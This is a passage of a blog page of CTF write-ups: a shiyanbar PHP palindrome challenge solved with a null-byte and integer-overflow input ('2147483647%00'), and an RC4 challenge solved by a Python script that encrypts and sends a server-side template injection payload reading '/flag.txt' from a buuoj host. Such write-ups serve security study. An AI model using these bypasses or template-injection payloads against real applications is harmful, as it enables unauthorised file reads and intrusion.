+<h3 id="shiyanbar-do-you-really-know-phpplalindrome">shiyanbar do you really know php?(plalindrome)<a hidden class="anchor" aria-hidden="true" href="#shiyanbar-do-you-really-know-phpplalindrome">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$info <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>$req <span style="color:#f92672">=</span> [];
+</span></span><span style="display:flex;"><span>$flag<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;xxxxxxxxxx&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#34;display_error&#34;</span>, <span style="color:#66d9ef">false</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;number&#39;</span>])){
+</span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;hint:6c525af4059b4fe7d8c33a.txt&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;have a fun!!&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span>([$_POST] <span style="color:#66d9ef">as</span> $global_var) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">foreach</span>($global_var <span style="color:#66d9ef">as</span> $key <span style="color:#f92672">=&gt;</span> $value) {
+</span></span><span style="display:flex;"><span>        $value <span style="color:#f92672">=</span> <span style="color:#a6e22e">trim</span>($value);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">is_string</span>($value) <span style="color:#f92672">&amp;&amp;</span> $req[$key] <span style="color:#f92672">=</span> <span style="color:#a6e22e">addslashes</span>($value);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">is_palindrome_number</span>($number) {
+</span></span><span style="display:flex;"><span>    $number <span style="color:#f92672">=</span> <span style="color:#a6e22e">strval</span>($number);
+</span></span><span style="display:flex;"><span>    $i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    $j <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>($number) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>($i <span style="color:#f92672">&lt;</span> $j) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>($number[$i] <span style="color:#f92672">!==</span> $number[$j]) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        $i<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>        $j<span style="color:#f92672">--</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//can not input number
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">is_numeric</span>($_REQUEST[<span style="color:#e6db74">&#39;number&#39;</span>])){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   $info<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;sorry, you cann&#39;t input a number!&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//the number must be int-type
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}<span style="color:#66d9ef">elseif</span>($req[<span style="color:#e6db74">&#39;number&#39;</span>]<span style="color:#f92672">!=</span><span style="color:#a6e22e">strval</span>(<span style="color:#a6e22e">intval</span>($req[<span style="color:#e6db74">&#39;number&#39;</span>]))){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>     $info <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;number must be equal to it&#39;s integer!! &#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>     $value1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">intval</span>($req[<span style="color:#e6db74">&#34;number&#34;</span>]);
+</span></span><span style="display:flex;"><span>     $value2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">intval</span>(<span style="color:#a6e22e">strrev</span>($req[<span style="color:#e6db74">&#34;number&#34;</span>]));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//the number should be plalindrome
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>     <span style="color:#66d9ef">if</span>($value1<span style="color:#f92672">!=</span>$value2){
+</span></span><span style="display:flex;"><span>          $info<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;no, this is not a palindrome number!&#34;</span>;
+</span></span><span style="display:flex;"><span>     }<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//the number should not be plalindrome
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>          <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">is_palindrome_number</span>($req[<span style="color:#e6db74">&#34;number&#34;</span>])){
+</span></span><span style="display:flex;"><span>              $info <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;nice! </span><span style="color:#e6db74">{</span>$value1<span style="color:#e6db74">}</span><span style="color:#e6db74"> is a palindrome number!&#34;</span>;
+</span></span><span style="display:flex;"><span>          }<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>             $info<span style="color:#f92672">=</span>$flag;
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>     }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> $info;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>payload :2147483647%00</p>
+<p>first: as there is %00, is_numeric() will not recognize it as number</p>
+<p>second: both strval and intval will ignore %00 and %20</p>
+<p>third: after strrev() 2147483647 will turn to 7463847412 , however, intval() can hanle max num of 2147483647,
+so intval(7463847412)=2147483647</p>
+<p>forth: the number is not plalindrome,so get the flag</p>
+<h2 id="rc4">RC4<a hidden class="anchor" aria-hidden="true" href="#rc4">#</a></h2>
+<p>rc4: 加密和解密都是同一个流程</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://43141291-ab15-4d3a-a236-3c2c0fd69898.node3.buuoj.cn/secret?secret=&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">RC4</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__init__</span>(self, key):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>key <span style="color:#f92672">=</span> key
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>key_length <span style="color:#f92672">=</span> len(key)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>_init_S_box()
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_init_S_box</span>(self):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>Box <span style="color:#f92672">=</span> [i <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>)]
+</span></span><span style="display:flex;"><span>        k <span style="color:#f92672">=</span> [self<span style="color:#f92672">.</span>key[i <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>key_length] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>)]
+</span></span><span style="display:flex;"><span>        j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
+</span></span><span style="display:flex;"><span>            j <span style="color:#f92672">=</span> (j <span style="color:#f92672">+</span> self<span style="color:#f92672">.</span>Box[i] <span style="color:#f92672">+</span> ord(k[i])) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Box[i], self<span style="color:#f92672">.</span>Box[j] <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>Box[j], self<span style="color:#f92672">.</span>Box[i]
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">crypt</span>(self, plaintext):
+</span></span><span style="display:flex;"><span>        i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> ch <span style="color:#f92672">in</span> plaintext:
+</span></span><span style="display:flex;"><span>            i <span style="color:#f92672">=</span> (i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>
+</span></span><span style="display:flex;"><span>            j <span style="color:#f92672">=</span> (j <span style="color:#f92672">+</span> self<span style="color:#f92672">.</span>Box[i]) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Box[i], self<span style="color:#f92672">.</span>Box[j] <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>Box[j], self<span style="color:#f92672">.</span>Box[i]
+</span></span><span style="display:flex;"><span>            t <span style="color:#f92672">=</span> (self<span style="color:#f92672">.</span>Box[i] <span style="color:#f92672">+</span> self<span style="color:#f92672">.</span>Box[j]) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>
+</span></span><span style="display:flex;"><span>            result <span style="color:#f92672">+=</span> chr(self<span style="color:#f92672">.</span>Box[t] <span style="color:#f92672">^</span> ord(ch))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> result
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>a <span style="color:#f92672">=</span> RC4(<span style="color:#e6db74">&#39;HereIsTreasure&#39;</span>)
+</span></span><span style="display:flex;"><span>cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;{{ [].__class__.__base__.__subclasses__()[40](&#39;/flag.txt&#39;).read() }}&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote(a<span style="color:#f92672">.</span>crypt(cmd))
+</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url <span style="color:#f92672">+</span> payload)
+</span></span><span style="display:flex;"><span>print(res<span style="color:#f92672">.</span>text)
+</span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://dragonbox.top/posts/sec-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>流量分析</span>
+  </a>
+  <a class="next" href="https://dragonbox.top/posts/ctf-bugku-writeup/">
+    <span class="title">Next »</span>
+    <br>
+    <span>bugku writeup</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://dragonbox.top/">ch4ser の 超元域</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
